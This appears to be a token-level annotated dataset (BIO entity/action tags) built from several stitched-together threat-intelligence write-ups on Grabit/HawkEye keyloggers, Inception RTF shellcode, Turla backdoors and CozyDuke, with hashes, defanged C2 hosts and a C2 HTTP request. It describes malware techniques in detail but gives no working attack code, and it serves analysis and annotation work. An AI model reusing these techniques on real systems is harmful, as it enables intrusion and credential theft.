,	O
the	O
Keylogger	O
functionality	O
prepares	O
files	O
that	O
act	O
as	O
a	O
container	O
for	O
keyboard	O
interrupts	O
,	O
collecting	O
hostnames	O
,	O
application	O
names	O
,	O
usernames	O
and	O
passwords	O
.	O
However	O
,	O
the	O
interesting	O
part	O
lies	O
here	O
.	O
The	O
file	O
names	O
contain	O
a	O
very	O
informative	O
string	O
.	O
HawkEye_Keylogger_Execution_Confirmed_<VICTIM	O
>	O
3.10.2015	O
6:08:31	O
PM	O
HawkEye	O
is	O
a	O
commercial	O
tool	O
that	O
has	O
been	O
in	O
development	O
for	O
a	O
few	O
years	O
now	O
;	O
it	O
appeared	O
in	O
2014	O
,	O
as	O
a	O
website	O
called	O
HawkEyeProducts	O
,	O
and	O
made	O
a	O
very	O
famous	O
contribution	O
to	O
the	O
hacker	O
community	O
.	O
In	O
the	O
website	O
,	O
the	O
product	O
shows	O
great	O
versatility	O
as	O
it	O
contains	O
many	O
types	O
of	O
RATs	O
,	O
features	O
and	O
functionality	O
,	O
such	O
as	O
the	O
traditional	O
HawkEye	O
Logger	O
or	O
other	O
types	O
of	O
remote	O
administration	O
tools	O
like	O
Cyborg	O
Logger	O
,	O
CyberGate	O
,	O
DarkComet	O
,	O
NanoCore	O
and	O
more	O
.	O
It	O
seems	O
to	O
support	O
three	O
types	O
of	O
delivery	O
:	O
FTP	O
,	O
SMTP	O
and	O
Web	O
-	O
Panel	O
.	O
As	O
seen	O
,	O
the	B-Entity
malware	I-Entity
uses	O
a	O
number	B-Entity
of	I-Entity
RATs	I-Entity
to	B-Modifier
control	O
its	O
victims	O
or	O
track	O
their	O
activity	O
.	O
One	O
of	O
the	O
threat	O
actor	O
's	O
successful	O
implementations	O
contained	O
the	O
well	O
-	O
known	O
DarkComet	O
.	O
This	O
convenient	O
"	O
choose	O
your	O
RAT	O
"	O
functionality	O
plays	O
a	O
very	O
important	O
role	O
in	O
the	O
malware	O
infection	O
,	O
routine	O
and	O
survival	O
on	O
the	O
victim	O
's	O
machine	O
.	O
The	O
DarkComet	O
samples	O
are	O
more	O
complicated	O
than	O
the	O
traditional	O
HawkEye	O
logger	O
.	O
One	O
instance	O
had	O
a	O
random	O
key	O
generator	O
which	O
sets	O
an	O
initialization	O
vector	O
of	O
the	O
first	O
4	O
bytes	O
of	O
the	O
executable	O
file	O
and	O
appends	O
a	O
random	O
5	O
byte	O
key	O
that	O
unpacks	O
another	O
PE	O
file	O
,	O
less	O
than	O
20Kb	O
in	O
size	O
.	O
The	O
PE	O
file	O
then	O
contains	O
another	O
packer	O
with	O
an	O
even	O
more	O
challenging	O
obfuscation	O
technique	O
.	O
The	O
last	O
sample	O
we	O
tested	O
had	O
still	O
more	O
complicated	O
behavior	O
.	O
The	O
code	O
itself	O
had	O
the	O
same	O
obfuscation	O
technique	O
,	O
though	O
traffic	O
was	O
not	O
transferring	O
in	O
clear	O
text	O
.	O
Stolen	O
data	O
was	O
packed	O
and	O
sent	B-Action
encrypted	I-Action
over	O
HTTP	B-Entity
random	B-Entity
ports	I-Entity
.	O
This	O
means	O
that	O
the	O
group	O
is	O
trying	O
to	O
produce	O
other	O
types	O
of	O
malicious	O
samples	O
with	O
different	O
RATs	O
.	O
Approximately	O
10,000	O
stolen	O
files	O
have	O
been	O
collected	O
.	O
Companies	O
based	O
in	O
Thailand	O
and	O
India	O
had	O
the	O
largest	O
percentage	O
of	O
infected	O
machines	O
.	O
By	O
looking	O
at	O
the	O
stolen	O
credentials	O
,	O
it	O
is	O
very	O
clear	O
that	O
employees	O
sent	O
the	O
malware	O
to	O
one	O
another	O
,	O
as	O
stolen	O
host	O
names	O
and	O
internal	O
applications	O
are	O
the	O
same	O
.	O
The	O
following	O
is	O
the	O
full	O
chart	O
,	O
updated	O
to	O
May	O
2015	O
.	O
Malware	O
distribution	O
by	O
country	O
Demonstrating	O
the	O
effectiveness	O
of	O
their	O
simple	O
Keyloggers	O
,	O
one	O
C2	O
(	O
on	O
May	O
15th	O
)	O
maintained	O
thousands	O
of	O
victim	O
account	O
credentials	O
from	O
hundreds	O
of	O
infected	O
systems	O
.	O
To	O
sum	O
it	O
up	O
,	O
Grabit	O
threat	O
actors	O
did	O
not	O
use	O
any	O
sophisticated	O
evasions	O
or	O
maneuvers	O
in	O
their	O
dynamic	O
activity	O
.	O
It	O
is	O
interesting	O
to	O
see	O
the	O
major	O
differences	O
between	O
the	O
core	O
development	O
of	O
the	O
malware	O
and	O
the	O
actual	O
functionality	O
it	O
uses	O
.	O
Some	O
malware	O
samples	O
used	O
the	O
same	O
hosting	O
server	O
,	O
and	O
even	O
the	O
same	O
credentials	O
.	O
Could	O
it	O
be	O
that	O
our	O
threat	O
actor	O
was	O
in	O
a	O
hurry	O
?	O
Our	O
guess	O
is	O
that	O
we	O
are	O
looking	O
at	O
a	O
group	O
and	O
not	O
an	O
individual	O
.	O
Some	O
members	O
of	O
the	O
group	O
are	O
more	O
technical	O
than	O
the	O
others	O
and	O
some	O
are	O
more	O
security	O
oriented	O
and	O
aware	O
of	O
the	O
risks	O
they	O
might	O
expose	O
themselves	O
to	O
.	O
Back	O
to	O
square	O
one	O
.	O
From	O
what	O
we	O
have	O
seen	O
so	O
far	O
,	O
the	B-Entity
malware	I-Entity
is	O
being	O
delivered	O
as	O
a	O
Microsoft	B-Entity
Office	I-Entity
Word	I-Entity
(	I-Entity
.doc	I-Entity
)	I-Entity
email	I-Entity
attachment	I-Entity
,	O
containing	O
a	O
malicious	O
macro	O
called	O
AutoOpen	O
.	O
This	O
macro	O
simply	O
opens	O
a	O
socket	O
over	O
TCP	O
and	O
sends	O
an	O
HTTP	O
request	O
to	O
a	O
remote	O
server	O
that	O
was	O
hacked	O
by	O
the	O
group	O
to	O
serve	O
as	O
a	O
malware	O
hub	O
,	O
before	O
downloading	O
the	O
malware	O
.	O
In	O
some	O
cases	O
the	O
malicious	O
macro	O
was	O
password	O
protected	O
,	O
but	O
our	O
threat	O
actor	O
might	O
have	O
forgotten	O
that	O
a	O
.doc	O
file	O
is	O
actually	O
an	O
archive	O
and	O
when	O
that	O
archive	O
is	O
opened	O
in	O
a	O
convenient	O
editor	O
of	O
your	O
choice	O
,	O
the	O
macro	O
strings	O
are	O
shown	O
in	O
clear	O
-	O
text	O
.	O
The	O
malware	O
is	O
in	O
plain	O
view	O
,	O
modifying	O
commonplace	B-Action
registry	B-Entity
entries	I-Entity
,	O
such	O
as	O
the	O
startup	O
configurations	O
,	O
and	O
not	O
covering	O
its	O
tracks	O
.	O
Its	O
binaries	O
are	O
not	O
deleted	O
in	O
most	O
cases	O
,	O
and	O
its	O
communication	O
is	O
in	O
clear-	O
text	O
,	O
where	O
the	O
victim	O
can	O
sniff	O
the	O
communication	O
and	O
grab	O
the	O
FTP	O
/	O
SMTP	O
server	O
's	O
credentials	O
.	O
Malware	O
derivatives	O
are	O
mainly	O
located	O
in	O
.	O
C:\Users\	O
<	O
user	O
>	O
\AppData\Roaming\Microsoft	O
Phishing	O
extensions	O
:	O
.doc	O
3f77403a64a2dde60c4962a6752de601d56a621a	O
4E7765F3BF73AEC6E350F412B623C23D37964DFC	O
Icons	O
:	O
.pdf	O
,	O
.doc	O
,	O
.ttf	O
,	O
.xls	O
,	O
.ppt	O
,	O
.msg	O
,	O
.exe	O
Stealer	O
:	O
.txt	O
,	O
.jpeg	O
,	O
.eml	O
Additional	O
Executable	O
names	O
.	O
Malware	O
extensions	O
:	O
.zip	O
or	O
.exe	O
IP	O
Addresses	O
.	O
After	O
reading	O
the	O
Inception	O
paper	O
by	O
Snorre	O
Fagerland	O
and	O
Waylon	O
Grange	O
,	O
I	O
got	O
curious	O
about	O
this	O
threat	O
and	O
did	O
some	O
reversing	O
.	O
I	O
felt	O
that	O
it	O
would	O
be	O
good	O
to	O
write	O
a	O
technical	O
blog	O
about	O
the	O
process	O
-	O
maybe	O
it	O
could	O
be	O
helpful	O
or	O
interesting	O
for	O
some	O
.	O
RTF	O
file	O
Analysis	O
MD5	O
:	O
4a4874fa5217a8523bf4d1954efb26ef	O
Exploit	O
:	O
CVE-2012	O
-	O
0158	O
As	O
we	O
can	O
see	O
in	O
following	O
screen	O
shot	O
,	O
this	O
is	O
a	O
RTF	O
[	O
Rich	O
Text	O
Format	O
]	O
file	O
.	O
Its	O
common	O
that	O
attackers	O
use	O
document	O
files	O
such	O
as	O
these	O
as	O
bait	O
.	O
It	O
is	O
common	O
that	O
shellcode	O
starts	O
with	O
a	O
NOPsled	O
.	O
In	O
following	O
screenshot	O
we	O
can	O
see	O
that	O
the	O
embedded	O
shellcode	O
starts	O
with	O
NOP	O
slide	O
.	O
NOP	O
,	O
or	O
No	O
OPeration	O
-	O
is	O
a	O
single	O
-	O
byte	O
opcode	O
that	O
does	O
nothing	O
.	O
It	O
has	O
the	O
hex	O
value	O
of	O
0x90	O
.	O
Now	O
,	O
to	O
the	O
functionality	O
of	O
the	O
shellcode	O
.	O
We	O
will	O
ignore	O
the	O
first	O
two	O
prolog	O
instructions	O
,	O
and	O
for	O
remaining	O
statements	O
I	O
have	O
inserted	O
comments	O
to	O
help	O
understanding	O
what	O
is	O
happening	O
in	O
this	O
chunk	O
of	O
code	O
.	O
It	O
's	O
traversing	O
the	O
TEB	O
,	O
the	O
PEB	O
and	O
the	O
Ldr	O
structure	O
to	O
get	O
the	O
base	O
addresses	O
of	O
ntdll.dll	O
and	O
kernel32.dll	O
.	O
It	O
needs	O
these	O
to	O
find	O
the	O
API	O
addresses	O
it	O
requires	O
for	O
the	O
rest	O
of	O
the	O
infection	O
.	O
In	O
screenshot	O
below	O
,	O
Function	O
00120F82	O
is	O
the	O
malware	O
's	O
own	O
GetProcAddress	O
function	O
which	O
takes	O
two	O
parameters	O
The	O
function	O
returns	O
the	O
memory	O
address	O
of	O
the	O
API	O
.	O
As	O
shown	O
in	O
the	O
next	O
screenshot	O
,	O
this	O
function	O
parses	O
the	O
"	O
export	O
name	O
pointer	O
table	O
"	O
of	O
the	O
.dll	O
[	O
ex	O
.	O
kernel32.dll	O
]	O
and	O
generates	O
a	O
hash	O
for	O
each	O
function	O
.	O
It	O
compares	O
this	O
with	O
the	O
argument	O
API	O
hash	O
(	O
Ex	O
DF7D9BAD	O
for	O
GetFileSize	O
,	O
see	O
above	O
screenshot	O
)	O
using	O
the	O
CMP	O
EDI	O
,	O
ESI	O
instruction	O
.	O
Once	O
the	O
matching	O
API	O
is	O
found	O
it	O
parses	O
the	O
Export	O
Address	O
Table	O
and	O
returns	O
the	O
respective	O
API	O
address	O
to	O
the	O
caller	O
in	O
EAX	O
register	O
.	O
The	O
document	O
contains	O
two	O
levels	O
of	O
shellcode	O
.	O
We	O
are	O
analyzing	O
first	O
level	O
,	O
and	O
in	O
the	O
following	O
code	O
we	O
can	O
see	O
a	O
typical	O
egghunting	O
method	O
:	O
It	O
attempts	O
to	O
open	O
the	O
already	O
opened	O
rtf	O
file	O
by	O
checking	O
file	O
handles	O
in	O
memory	O
.	O
It	B-Entity
starts	O
with	O
a	O
handle	O
with	O
the	O
value	O
4	O
and	O
verifies	O
it	O
by	O
doing	O
GetFileSize	O
on	O
it	O
.	O
If	O
this	O
fails	O
it	O
does	O
ADD	O
ESI,4	O
again	O
(	O
adds	O
4	O
to	O
the	O
handle	O
)	O
until	O
the	O
API	O
succeeds	O
.	O
When	O
this	O
happens	O
it	O
checks	O
the	O
file	O
offset	O
0x8300	O
for	O
the	O
marker	O
0x54405450	O
.	O
Again	O
,	O
if	O
this	O
matches	O
up	O
,	O
it	O
allocates	O
memory	O
into	O
which	O
it	O
reads	O
the	O
file	O
content	O
and	O
jumps	O
to	O
the	O
2nd	O
level	O
shellcode	O
with	O
a	O
JMP	O
EBX	O
.	O
Now	O
we	O
have	O
landed	O
into	O
the	O
second	O
level	O
shellcode	O
,	O
but	O
it	O
is	O
obfuscated	B-Action
to	B-Modifier
evade	I-Modifier
static	B-Entity
analysis	I-Entity
.	O
At	O
the	O
initial	O
stage	O
there	O
are	O
few	O
instructions	O
waiting	O
to	O
help	O
us	O
.	O
This	O
is	O
the	O
deobfuscation	O
code	O
.	O
We	O
can	O
see	O
that	O
0x23B	O
*	O
4	O
is	O
the	O
number	O
of	O
bytes	O
obfuscated	O
,	O
POP	O
EBX	O
is	O
the	O
get	O
EIP	O
instruction	O
and	O
0x5687F945	O
is	O
the	O
deobfuscation	O
XOR	O
key	O
.	O
In	O
following	O
code	O
we	O
can	O
see	O
the	O
hexadecimal	O
value	O
that	O
corresponds	O
to	O
the	O
library	O
name	O
being	O
pushed	O
to	O
the	O
LoadLibrary	O
function	O
,	O
as	O
well	O
as	O
two	O
loops	O
to	O
get	O
the	O
API	O
addresses	O
using	O
"	O
CALL	O
02E203E2	O
"	O
function	O
.	O
Here	O
also	O
it	O
uses	O
hashes	O
to	O
look	O
up	O
APIs	O
.	O
In	O
the	O
following	O
code	O
it	O
searches	O
for	O
the	O
embedded	O
VBS	O
file	O
inside	O
the	O
RTF	O
file	O
in	O
memory	O
.	O
It	O
checks	O
for	O
the	O
file	O
size	O
in	O
a	O
loop	O
,	O
and	O
if	O
the	O
size	O
is	O
larger	O
than	O
0x2000	O
then	O
it	O
sets	O
the	O
file	O
ponter	O
to	O
0x8C14	O
to	O
compare	O
with	O
the	O
VBS	O
file	O
marker	O
as	O
we	O
can	O
see	O
in	O
following	O
screenshot	O
.	O
After	O
finding	O
the	O
VBS	O
marker	O
in	O
memory	O
,	O
it	O
decrypts	O
the	O
VBS	O
file	O
in	O
two	O
iterations	O
.	O
In	O
the	O
first	O
loop	O
it	O
decrypts	O
and	O
in	O
the	O
second	O
loop	O
it	O
swaps	O
the	O
low	O
and	O
high	O
bytes	O
of	O
the	O
first	O
0x100	O
16-bit	O
words	O
,	O
after	O
which	O
it	O
writes	O
the	O
file	O
to	O
a	O
file	O
named	O
"	O
Temp	O
/	O
ew_Rg.vbs	O
"	O
.	O
The	O
following	O
screenshot	O
shows	O
a	O
part	O
of	O
the	O
.VBS	O
payload	O
file	O
dropped	O
by	O
.RTF	O
file	O
.	O
First	O
line	O
is	O
the	O
encrypted	O
.dll	O
4th	O
line	O
contains	O
Key	O
to	O
decrypt	O
the	O
.dll	O
.	O
Remaining	O
part	O
is	O
self	O
-	O
explanatory	O
.	O
The	O
instruction	O
c	O
=	O
Crypt(c	O
,	O
k	O
)	O
function	O
decrypts	O
the	O
encrypted	O
dll	O
and	O
returns	O
the	O
decrypted	O
dll	O
.	O
(	O
See	O
the	O
screenshot	O
above	O
)	O
c=	O
encrypted	O
dll	O
.	O
k	O
=	O
decryption	O
key	O
.	O
Following	O
function	O
writes	O
byte	O
by	O
byte	O
to	O
the	O
dropped.dll	O
file	O
.	O
Finally	O
,	O
the	O
following	O
code	O
executes	O
the	O
"	O
regsvr32	O
"	O
command	O
to	O
run	O
the	O
wmiprvse.dll	O
in	O
silent	O
mode	O
and	O
sets	O
the	O
run	O
key	O
in	O
registry	O
.	O
This	O
first	O
level	O
of	O
deobfuscation	O
in	O
wmiprvse.dll	O
takes	O
around	O
3	O
-	O
4	O
minutes	O
to	O
finish	O
.	O
Then	O
it	O
allocates	O
memory	O
using	O
VirtualAlloc	O
and	O
writes	O
the	O
unpacked	O
code	O
to	O
newly	O
allocated	O
memory	O
before	O
it	O
jumps	O
to	O
the	O
unpacked	O
code	O
as	O
shown	O
in	O
following	O
screen	O
shot	O
.	O
This	O
dll	O
has	O
3	O
layers	O
of	O
unpacking	O
.	O
The	O
one	O
above	O
is	O
level	O
one	O
,	O
below	O
iyou	O
can	O
see	O
level	O
two	O
.	O
We	O
can	O
see	O
the	O
passing	O
of	O
the	O
control	O
to	O
the	O
newly	O
unpacked	O
.dll	O
@CALL	O
EAX	O
.	O
It	O
's	O
very	O
time	O
-	O
consuming	O
to	O
understand	O
the	O
functionality	O
of	O
the	O
dll	O
as	O
it	O
decrypts	O
and	O
builds	O
its	O
own	B-Entity
runtime	I-Entity
import	I-Entity
table	I-Entity
to	B-Modifier
hinder	I-Modifier
the	B-Entity
analysis	I-Entity
.	O
Analyst	O
can	O
not	O
directly	O
see	O
which	O
API	O
gets	O
called	O
.	O
Finally	O
we	O
can	O
see	O
it	O
's	O
connecting	B-Action
to	B-Modifier
webdav.cloudme.com	B-Entity
and	O
cleartext	O
credentials	O
in	O
following	O
screenshot	O
.	O
Malware	O
tries	O
to	O
communicate	B-Action
with	O
the	O
user	B-Entity
account	I-Entity
created	I-Entity
at	I-Entity
the	I-Entity
WebDAV	I-Entity
C&C	I-Entity
to	B-Modifier
exfiltrate	O
system	O
and	O
user	B-Entity
information	I-Entity
.	O
Reference	O
.	O
File	O
name	O
:	O
varies	O
MD5	O
:	O
a3cbf6179d437909eb532b7319b3dafe	O
Compilation	O
timestamp	O
:	O
2012.10.02	O
10:51:50	O
(	O
GMT	O
)	O
Compiler	O
:	O
Microsoft	O
Visual	O
Studio	O
2010	O
File	O
format	O
:	O
PE32	O
DLL	O
Exports	O
:	O
_	O
LowLevelKeyboardProc@12	O
Creates	O
the	O
log	B-Entity
file	I-Entity
:	I-Entity
%	I-Entity
TEMP%\~DFD3O8.tmp	I-Entity
.	O
If	O
failed	O
,	O
tries	O
to	O
write	O
to	O
the	O
file	O
f:\keyhook.log	O
Each	O
time	O
the	O
keylogger	O
starts	O
,	O
it	O
appends	O
the	O
following	O
header	O
to	O
the	O
log	O
file	O
.	O
--------------------------------------------------------------------------------	O
New	O
Session	O
:	O
%	O
fully	O
qualified	O
computer	O
name%	O
%	O
timestamp%	O
--------------------------------------------------------------------------------	O
It	O
then	O
creates	O
a	O
hidden	O
console	O
window	O
and	O
registers	O
its	B-Entity
only	I-Entity
export	I-Entity
_	I-Entity
LowLevelKeyboardProc@12	I-Entity
as	O
a	O
hook	B-Entity
procedure	I-Entity
for	I-Entity
low	I-Entity
-	I-Entity
level	I-Entity
keyboard	I-Entity
input	I-Entity
events	I-Entity
(	I-Entity
WH_KEYBOARD_LL	I-Entity
hook	I-Entity
)	I-Entity
.	O
Depending	O
on	O
the	O
results	O
,	O
it	O
writes	O
a	O
line	O
to	O
its	O
log	O
file	O
.	O
In	O
case	O
the	O
hook	O
was	O
installed	O
,	O
the	O
line	O
is	O
"	O
Started	O
...	O
"	O
,	O
else	O
"	O
LoadLibrary	O
'	O
%	O
path	O
to	O
its	O
file%	O
'	O
failed	O
,	O
%	O
error	O
code%	O
"	O
.	O
It	O
also	O
starts	O
a	O
thread	O
that	O
retrieves	O
the	O
current	O
foreground	O
window	O
handle	O
every	O
100	O
milliseconds	O
.	O
This	O
handle	O
is	O
then	O
used	O
in	O
the	O
keyboard	O
hook	O
procedure	O
.	O
The	O
low	B-Entity
-	I-Entity
level	I-Entity
keyboard	I-Entity
hook	I-Entity
procedure	I-Entity
intercepts	B-Action
WM_KEYDOWN	O
,	O
WM_KEYUP	O
and	O
WM	O
_	O
SYSKEYDOWN	O
system	O
messages	O
and	O
writes	O
information	B-Action
about	B-Entity
each	I-Entity
keystroke	I-Entity
to	B-Modifier
the	O
log	B-Entity
file	I-Entity
.	O
Every	O
time	O
a	O
new	O
window	O
becomes	O
active	O
,	O
it	O
retrieves	O
its	O
name	O
and	O
the	O
path	O
to	O
its	O
application	O
and	O
writes	O
this	O
information	O
to	O
the	O
log	O
file	O
.	O
[	O
%	O
path	O
to	O
the	O
application	O
's	O
executable	O
file%	O
:	O
"	O
%	O
window	O
title%	O
"	O
]	O
Analyzed	O
file	O
(	O
others	O
are	O
similar	O
)	O
.	O
Compilation	O
timestamp	O
:	O
2013.10.15	O
10:43:09	O
(	O
GMT	O
)	O
File	O
format	O
:	O
PE32	O
DLL	O
,	O
modified	O
(	O
the	O
file	O
is	O
supposed	O
to	O
be	O
started	O
by	O
a	O
custom	O
loader	O
)	O
Exports	O
.	O
The	O
main	O
functionality	O
is	O
implemented	O
in	O
a	O
single	O
function	O
that	O
is	O
called	O
by	O
the	O
DllMain	O
entry	O
point	O
.	O
The	O
exported	O
functions	O
allow	O
to	O
call	O
the	O
same	O
function	O
directly	O
(	O
exported	O
as	O
"	O
start	O
"	O
)	O
or	O
to	O
start	O
/	O
stop	O
it	O
in	O
a	O
separate	O
thread	O
(	O
"	O
ModuleStart"/"ModuleStop	O
"	O
)	O
and	O
with	O
slightly	O
different	O
parameters	O
.	O
This	O
indicates	O
the	O
backdoor	O
can	O
also	O
function	O
as	O
a	O
plugin	O
for	O
the	O
Turla	O
Carbon	O
system	O
.	O
The	O
main	O
function	O
executes	O
in	O
an	O
infinite	O
loop	O
.	O
It	B-Entity
collects	B-Action
most	I-Action
of	B-Entity
the	I-Entity
available	I-Entity
information	I-Entity
about	I-Entity
the	I-Entity
system	I-Entity
,	O
transmits	B-Action
it	B-Entity
to	B-Modifier
the	O
C&C	B-Entity
server	I-Entity
and	O
executes	O
the	O
commands	B-Entity
it	B-Entity
receives	I-Entity
back	I-Entity
.	O
The	O
module	O
delays	O
execution	O
for	O
random	O
periods	O
while	O
it	O
discovers	O
running	O
processes	O
with	O
one	O
of	O
the	O
following	O
filenames	O
.	O
The	O
following	O
system	O
information	O
is	O
collected	O
.	O
The	O
retrieved	B-Entity
information	I-Entity
is	O
compressed	B-Action
using	B-Modifier
bzip2	B-Entity
,	O
encrypted	B-Action
with	B-Modifier
AES	B-Entity
and	O
then	O
encoded	O
using	O
Base64	O
before	O
being	O
transmitted	O
to	O
the	O
C&C	B-Entity
server	I-Entity
.	O
When	O
there	O
is	O
a	O
file	O
waiting	O
for	O
upload	O
(	O
usually	O
,	O
this	O
is	O
file	O
that	O
contains	O
the	O
results	O
of	O
the	O
previously	O
received	O
and	O
executed	O
command	O
)	O
,	O
it	O
is	O
read	B-Action
from	B-Modifier
disk	B-Entity
and	O
uploaded	B-Action
to	B-Modifier
the	O
server	O
instead	O
of	O
the	O
system	O
information	O
.	O
The	O
C&C	O
communication	O
is	O
implemented	O
on	O
top	O
of	O
the	O
standard	O
HTTP	O
/	O
HTTPS	O
protocols	O
.	O
The	O
list	O
of	O
the	O
C&C	O
URLs	O
is	O
hardcoded	O
in	O
the	O
binary	O
but	O
may	O
be	O
overridden	O
by	O
further	O
commands	O
.	O
The	O
module	O
uses	O
Wininet	O
API	O
functions	O
for	O
issuing	O
HTTP	O
POST	B-Entity
requests	B-Action
to	B-Modifier
the	O
server	O
.	O
The	O
module	O
transmits	O
the	O
collected	B-Entity
information	I-Entity
in	O
the	O
body	B-Entity
of	I-Entity
the	I-Entity
POST	I-Entity
request	I-Entity
and	O
gets	O
new	O
commands	O
from	O
the	O
server	B-Entity
's	I-Entity
response	I-Entity
.	O
The	O
request	O
body	O
can	O
be	O
empty	O
if	O
there	O
is	O
no	O
new	O
information	O
to	O
upload	O
.	O
The	O
response	O
is	O
usually	O
an	O
HTML	O
document	O
and	O
the	O
commands	O
are	O
Base64-encoded	O
strings	O
enclosed	O
in	O
<	O
div>/</div	O
>	O
tags	O
.	O
Every	O
command	O
is	O
encrypted	O
using	O
asymmetric	O
encryption	O
with	O
temporary	O
AES	O
session	O
keys	O
.	O
Each	O
command	O
is	O
a	O
mixed	O
text	O
/	O
binary	O
buffer	O
.	O
It	O
consists	O
of	O
two	O
parts	O
:	O
payload	O
and	O
configuration	O
.	O
The	O
configuration	O
is	O
an	O
INI	O
file	O
that	O
controls	O
the	O
further	B-Entity
behavior	I-Entity
of	I-Entity
the	I-Entity
module	I-Entity
.	O
It	O
is	O
extracted	O
into	O
a	O
temporary	O
file	O
named	O
%	O
TEMP%\~D%random%.tmp	O
.	O
The	O
payload	O
,	O
if	O
exists	O
,	O
is	O
supposed	O
to	O
be	O
an	O
executable	O
file	O
and	O
may	O
be	O
executed	O
if	O
there	O
is	O
a	O
corresponding	O
command	O
present	O
in	O
the	O
INI	O
part	O
.	O
The	O
format	O
of	O
the	O
decoded	O
command	O
is	O
the	O
following	O
.	O
Format	O
of	O
the	O
C&C	O
command	O
buffer	O
Available	O
commands	O
are	O
.	O
Lateral	O
movement	O
tools	O
.	O
Epic	O
/	O
Tavdig	O
backdoors	O
.	O
Dropper	O
packages	O
that	O
installs	B-Action
both	O
Epic	O
and	O
Turla	O
Carbon	O
system	O
.	O
PDF	O
exploits	O
used	O
in	O
spearphishing	O
attacks	O
drops	O
Epic	O
backdoor	O
.	O
SCR	O
/	O
EXE	O
files	O
-	O
used	O
in	O
spearphishing	O
/	O
social	O
engineering	O
.	O
Fake	O
"	O
Adobe	O
Flash	O
Player	O
"	O
Epic	O
backdoor	O
installers	O
.	O
Unit	O
42	O
has	O
uncovered	O
a	O
new	O
campaign	O
from	O
the	O
CozyDuke	O
threat	O
actors	O
,	O
aka	O
CozyCar	O
[	O
1	O
]	O
,	O
leveraging	O
malware	O
that	O
appears	O
to	O
be	O
related	O
to	O
the	O
Seaduke	O
malware	O
described	O
earlier	O
this	O
week	O
by	O
Symantec	O
.	O
[	O
2	O
]	O
This	O
campaign	O
,	O
which	O
began	O
on	O
July	O
7	O
,	O
2015	O
,	O
appears	O
to	O
be	O
targeted	O
at	O
government	O
organizations	O
and	O
think	O
-	O
tanks	O
located	O
in	O
democratic	O
countries	O
[	O
3	O
]	O
,	O
and	O
utilizes	O
compromised	B-Action
,	B-Entity
legitimate	I-Entity
websites	I-Entity
for	O
spear	O
phishing	O
and	O
command	O
and	O
control	O
activity	O
.	O
Unit	O
42	O
discovered	O
the	O
extent	O
of	O
this	O
attack	O
using	O
the	O
Palo	O
Alto	O
Networks	O
AutoFocus	O
service	O
,	O
which	O
allows	O
analysts	O
to	O
quickly	O
find	O
correlations	O
among	O
malware	O
samples	O
analyzed	O
by	O
WildFire	O
.	O
All	O
files	O
referenced	O
throughout	O
the	O
analysis	O
are	O
contained	O
in	O
the	O
IOC	O
table	O
at	O
the	O
end	O
of	O
this	O
blog	O
.	O
The	O
current	B-Entity
CozyCar	I-Entity
campaign	I-Entity
includes	O
spear	O
phishing	B-Entity
emails	I-Entity
that	I-Entity
deliver	I-Entity
the	I-Entity
payload	I-Entity
from	I-Entity
either	I-Entity
by	I-Entity
a	I-Entity
link	I-Entity
to	I-Entity
a	I-Entity
.zip	I-Entity
file	I-Entity
on	I-Entity
a	I-Entity
compromised	I-Entity
website	I-Entity
or	I-Entity
by	I-Entity
direct	I-Entity
delivery	I-Entity
as	I-Entity
an	I-Entity
attachment	I-Entity
to	I-Entity
the	I-Entity
phish	I-Entity
.	O
At	O
the	O
time	O
of	O
our	O
analysis	O
,	O
the	O
phishing	O
link	O
was	O
no	O
longer	O
active	O
.	O
When	O
a	O
user	O
opens	O
the	O
attached	O
file	O
a	O
poorly	O
detected	O
executable	O
file	O
[	O
VT	O
1/54	O
]	O
is	O
extracted	O
.	O
The	O
initial	O
dropper	O
is	O
a	O
self	O
-	O
extracting	O
archive	O
(	O
SFX	O
)	O
.	O
Upon	O
execution	O
,	O
this	O
executable	O
file	O
will	O
drop	O
two	O
files	O
in	O
the	O
%	O
TEMP%	O
directory	O
:	O
a	O
decoy	O
.wav	O
file	O
and	O
the	O
secondary	O
dropper	O
.	O
The	O
CozyDuke	O
group	O
commonly	O
uses	O
legitimate	O
media	O
files	O
to	O
trick	O
users	O
.	O
In	O
reality	O
,	O
while	O
the	O
media	O
-	O
a	O
.wav	O
file	O
with	O
a	O
female	O
voice	O
claiming	O
to	O
be	O
a	O
reporter	O
looking	O
for	O
commentary	O
-	O
is	O
played	O
,	O
the	O
secondary	O
dropper	O
executes	O
in	O
the	O
background	O
.	O
The	O
secondary	O
dropper	O
requests	O
a	O
.swf	O
file	O
using	O
SSL	O
as	O
illustrated	O
in	O
the	O
HTTP	O
traffic	O
below	O
.	O
As	O
of	O
this	O
writing	O
,	O
the	O
domain	O
extranet.qualityplanning[.]com	O
resolved	O
to	O
64.244.34[.]200	O
.	O
GET	B-Entity
/webscriptsecurity	O
/	O
view/4/player.swf	O
HTTP/1.1	O
Accept	O
:	O
text	O
/	O
html	O
,	O
application	O
/	O
xhtml+xml,*/	O
*	O
Accept	O
-	O
Language	O
:	O
en_US	O
User	O
-	O
Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
Trident/4.0	O
;	O
.NET	O
CLR	O
1.1.4322	O
;	O
.NET	O
CLR	O
2.0.50727	O
)	O
Host	O
:	O
extranet.qualityplanning[.]com	O
Connection	O
:	O
Keep	O
-	O
Alive	O
GET	O
/webscriptsecurity	O
/	O
view/4/player.swf	O
HTTP/1.1	O
Accept	O
:	O
text	O
/	O
html	O
,	O
application	O
/	O
xhtml+xml,*/	O
*	O
Accept	O
-	O
Language	O
:	O
en_US	O
User	O
-	O
Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
8.0	O
;	O
Windows	O
NT	O
5.1	O
;	O
Trident/4.0	O
;	O
.NET	O
CLR	O
1.1.4322	O
;	O
.NET	O
CLR	O
2.0.50727	O
)	O
Host	O
:	O
extranet.qualityplanning[.]com	O
Connection	O
:	O
Keep	O
-	O
Alive	O
The	B-Entity
secondary	I-Entity
dropper	I-Entity
then	O
cleans	B-Action
up	I-Action
after	B-Modifier
itself	B-Entity
with	O
a	O
simple	B-Entity
vbs	I-Entity
script	I-Entity
(	O
md5:0d132ee171768dc30d14590ed2dbadd1	O
)	O
that	O
leaves	O
only	O
the	O
decoy	O
multimedia	O
file	O
behind	O
.	O
But	O
what	O
did	O
the	O
dropper	O
do	O
with	O
the	O
.swf	O
file	O
?	O
While	O
the	O
player.swf	O
file	O
downloaded	O
by	O
the	O
second	O
stage	O
dropper	O
does	O
contain	O
media	O
,	O
it	O
is	O
,	O
again	O
,	O
a	O
decoy	O
.	O
The	O
actual	O
flash	O
component	O
of	O
